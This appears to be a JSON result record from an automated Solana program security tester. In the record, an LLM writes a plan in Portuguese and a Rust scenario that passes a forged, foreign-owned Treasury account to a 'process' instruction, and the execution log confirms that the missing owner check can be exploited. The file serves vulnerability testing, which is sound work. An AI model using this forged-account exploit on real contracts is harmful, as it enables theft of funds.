@@ -1,0 +1,126 @@
+{
+  "category": "OWNER",
+  "verdict": "confirmed",
+  "exploit_successful": true,
+  "attack_result": "Success",
+  "reason": "ataque aceito e dano verificado: forged treasury accepted and used",
+  "attempts_used": 1,
+  "attempts": [
+    {
+      "attempt": 1,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 2309,
+        "completion_tokens": 584,
+        "latency_s": 3.72
+      },
+      "raw": "{\n  \"plan\": \"O cenário inicializa uma conta Treasury legítima via `initialize` para provar que o programa funciona e obter o estado esperado. Em seguida, o ataque chama `process` passando uma conta forjada pelo atacante (dono diferente do programa) com dados que imitam um Treasury ativo. O efeito medido é que a instrução aceita a conta forjada e executa com sucesso, demonstrando a falta de verificação de dono.\",\n  \"scenario\": \"let authority = Pubkey::new_unique();\\nlet treasury_key = Pubkey::new_unique();\\n\\n// Baseline: inicializa uma conta Treasury legítima\\nlet init_ix = env.anchor_ix(\\n    \\\"initialize\\\",\\n    &(1000u64,),\\n    vec![\\n        AccountMeta::new(treasury_key, true),\\n        AccountMeta::new(authority, true),\\n        AccountMeta::new_readonly(solana_program::system_program::id(), false),\\n    ],\\n);\\nlet init_accounts = vec![\\n    (treasury_key, empty_account()),\\n    (authority, wallet(1_000_000_000)),\\n    system_program_account(),\\n];\\nlet baseline_result = env.baseline(\\\"initialize treasury\\\", &init_ix, &init_accounts);\\n\\n// Ataque: chama process com uma conta forjada (dono diferente do programa)\\nlet forged_data = anchor_account_data(\\n    \\\"Treasury\\\",\\n    &(authority, 500u64, true),\\n);\\nlet forged_treasury = account(&Pubkey::new_unique(), &forged_data, None);\\n\\nlet attack_ix = env.anchor_ix(\\n    \\\"process\\\",\\n    &(),\\n    vec![\\n        AccountMeta::new_readonly(treasury_key, false),\\n        AccountMeta::new_readonly(authority, true),\\n    ],\\n);\\nlet attack_accounts = vec![\\n    (treasury_key, forged_treasury),\\n    (authority, wallet(1_000_000_000)),\\n];\\nlet attack_result = env.attack(\\\"process with forged treasury\\\", &attack_ix, &attack_accounts);\\n\\nif attack_result.program_result == ProgramResult::Success {\\n    env.effect(\\n        \\\"forged treasury accepted and used\\\",\\n        after(&attack_result, &treasury_key).owner() != &env.program_id,\\n    );\\n}\"\n}",
+      "plan": "O cenário inicializa uma conta Treasury legítima via `initialize` para provar que o programa funciona e obter o estado esperado. Em seguida, o ataque chama `process` passando uma conta forjada pelo atacante (dono diferente do programa) com dados que imitam um Treasury ativo. O efeito medido é que a instrução aceita a conta forjada e executa com sucesso, demonstrando a falta de verificação de dono.",
+      "scenario": "let authority = Pubkey::new_unique();\nlet treasury_key = Pubkey::new_unique();\n\n// Baseline: inicializa uma conta Treasury legítima\nlet init_ix = env.anchor_ix(\n    \"initialize\",\n    &(1000u64,),\n    vec![\n        AccountMeta::new(treasury_key, true),\n        AccountMeta::new(authority, true),\n        AccountMeta::new_readonly(solana_program::system_program::id(), false),\n    ],\n);\nlet init_accounts = vec![\n    (treasury_key, empty_account()),\n    (authority, wallet(1_000_000_000)),\n    system_program_account(),\n];\nlet baseline_result = env.baseline(\"initialize treasury\", &init_ix, &init_accounts);\n\n// Ataque: chama process com uma conta forjada (dono diferente do programa)\nlet forged_data = anchor_account_data(\n    \"Treasury\",\n    &(authority, 500u64, true),\n);\nlet forged_treasury = account(&Pubkey::new_unique(), &forged_data, None);\n\nlet attack_ix = env.anchor_ix(\n    \"process\",\n    &(),\n    vec![\n        AccountMeta::new_readonly(treasury_key, false),\n        AccountMeta::new_readonly(authority, true),\n    ],\n);\nlet attack_accounts = vec![\n    (treasury_key, forged_treasury),\n    (authority, wallet(1_000_000_000)),\n];\nlet attack_result = env.attack(\"process with forged treasury\", &attack_ix, &attack_accounts);\n\nif attack_result.program_result == ProgramResult::Success {\n    env.effect(\n        \"forged treasury accepted and used\",\n        after(&attack_result, &treasury_key).owner() != &env.program_id,\n    );\n}",
+      "run": {
+        "kind": "ran",
+        "events": [
+          {
+            "step": "setup",
+            "attacker_program": ""
+          },
+          {
+            "step": "baseline",
+            "note": "initialize treasury",
+            "result": "Success",
+            "compute_units": 12976,
+            "account_flags": "sw,sw,-r",
+            "ix_head": "afaf6d1f0d989bed",
+            "accounts": [
+              {
+                "key": "1111111ogCyDbaRMvkdsHB3qfdyFYaG1WtRUAfdh",
+                "signer": true,
+                "writable": true,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": "eeef7bee5901a8fd0000000000000001000000000000000000000000000000000000000000000000e80300000000000001"
+              },
+              {
+                "key": "1111111QLbz7JHiBTspS962RLKV8GndWFwiEaqKM",
+                "signer": true,
+                "writable": true,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              },
+              {
+                "key": "11111111111111111111111111111111",
+                "signer": false,
+                "writable": false,
+                "owner": "NativeLoader1111111111111111111111111111111",
+                "data_len": 14,
+                "head": "73797374656d5f70",
+                "digest": "d8e11c483f20607a",
+                "post": ""
+              }
+            ]
+          },
+          {
+            "step": "attack",
+            "note": "process with forged treasury",
+            "result": "Success",
+            "compute_units": 8482,
+            "account_flags": "-r,sr",
+            "ix_head": "32429210847f67bf",
+            "accounts": [
+              {
+                "key": "1111111ogCyDbaRMvkdsHB3qfdyFYaG1WtRUAfdh",
+                "signer": false,
+                "writable": false,
+                "owner": "11111112D1oxKts8YPdTJRG5FzxTNpMtWmq8hkVx3",
+                "data_len": 49,
+                "head": "eeef7bee5901a8fd",
+                "digest": "c99c47ae8fba3f6e",
+                "post": ""
+              },
+              {
+                "key": "1111111QLbz7JHiBTspS962RLKV8GndWFwiEaqKM",
+                "signer": true,
+                "writable": false,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              }
+            ]
+          },
+          {
+            "step": "effect",
+            "note": "forged treasury accepted and used",
+            "holds": true
+          }
+        ],
+        "runtime_trace": [
+          "Program 8anCcUkKVms75R4HYTnkbM6YGzAra9WTmXhNEY5RSaNw invoke [1]",
+          "Program 11111111111111111111111111111111 invoke [2]",
+          "Program 11111111111111111111111111111111 success",
+          "Program 8anCcUkKVms75R4HYTnkbM6YGzAra9WTmXhNEY5RSaNw consumed 12976 of 1400000 compute units",
+          "Program 8anCcUkKVms75R4HYTnkbM6YGzAra9WTmXhNEY5RSaNw success",
+          "Program 8anCcUkKVms75R4HYTnkbM6YGzAra9WTmXhNEY5RSaNw invoke [1]",
+          "Program 8anCcUkKVms75R4HYTnkbM6YGzAra9WTmXhNEY5RSaNw consumed 8482 of 1400000 compute units",
+          "Program 8anCcUkKVms75R4HYTnkbM6YGzAra9WTmXhNEY5RSaNw success"
+        ],
+        "elapsed_s": 1.8
+      },
+      "verdict": "confirmed",
+      "reason": "ataque aceito e dano verificado: forged treasury accepted and used"
+    }
+  ],
+  "case_id": "SSP-02-A-V",
+  "static_finding": {
+    "category": "OWNER",
+    "evidence": "",
+    "explanation": "",
+    "attack_hypothesis": "Verificar por execucao se a instrucao e vulneravel a Improper Owner Check."
+  }
+}
